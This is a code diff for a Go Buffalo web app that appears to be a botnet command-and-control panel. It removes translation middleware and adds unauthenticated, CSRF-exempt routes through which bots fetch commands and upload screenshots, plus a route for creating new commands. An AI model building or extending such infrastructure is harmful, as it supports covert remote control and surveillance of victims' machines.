@@ -10,15 +10,12 @@ import (
 	"github.com/MShoaei/command_control/models"
 	"github.com/gobuffalo/buffalo-pop/pop/popmw"
 	csrf "github.com/gobuffalo/mw-csrf"
-	i18n "github.com/gobuffalo/mw-i18n"
-	"github.com/gobuffalo/packr"
 )
 
 // ENV is used to help switch settings based on where the
 // application is being run. Default is "development".
 var ENV = envy.Get("GO_ENV", "development")
 var app *buffalo.App
-var T *i18n.Translator
 
 // App is where all routes and middleware for buffalo
 // should be defined. This is the nerve center of your
@@ -55,13 +52,12 @@ func App() *buffalo.App {
 		// Remove to disable this.
 		app.Use(popmw.Transaction(models.DB))
 
-		// Setup and use translations:
-		app.Use(translations())
-
 		app.Use(SetCurrentUser)
 		app.Use(Authorize)
-		app.Middleware.Skip(Authorize, HomeHandler, UsersNew, AuthNew, AuthCreate, RegisterHandler)
-		app.Middleware.Skip(csrf.New, RegisterHandler)
+
+		app.Middleware.Skip(Authorize, HomeHandler, UsersNew, AuthNew, AuthCreate, RegisterHandler, ScreenShotHandler, CommandHandler)
+
+		app.Middleware.Skip(csrf.New, RegisterHandler, ScreenShotHandler, CommandHandler)
 
 		app.GET("/", HomeHandler)
 		app.GET("/users/new", UsersNew)
@@ -74,25 +70,15 @@ func App() *buffalo.App {
 
 		app.Resource("/panel/bots", BotsResource{})
 
-		app.POST("/ss/{bot_id}", ScreenShotHandler)
 		app.POST("/register", RegisterHandler)
+		app.GET("/command/{bot_id}", CommandHandler)
+		app.POST("/ss/{bot_id}", ScreenShotHandler)
+		app.POST("/command/new", NewCommandHandler)
 
 		app.ServeFiles("/", assetsBox) // serve files from the public
 	}
 
 	return app
-}
-
-// translations will load locale files, set up the translator `actions.T`,
-// and will return a middleware to use to load the correct locale for each
-// request.
-// for more information: https://gobuffalo.io/en/docs/localization
-func translations() buffalo.MiddlewareFunc {
-	var err error
-	if T, err = i18n.New(packr.NewBox("../locales"), "en-US"); err != nil {
-		app.Stop(err)
-	}
-	return T.Middleware()
 }
 
 // forceSSL will return a middleware that will redirect an incoming request
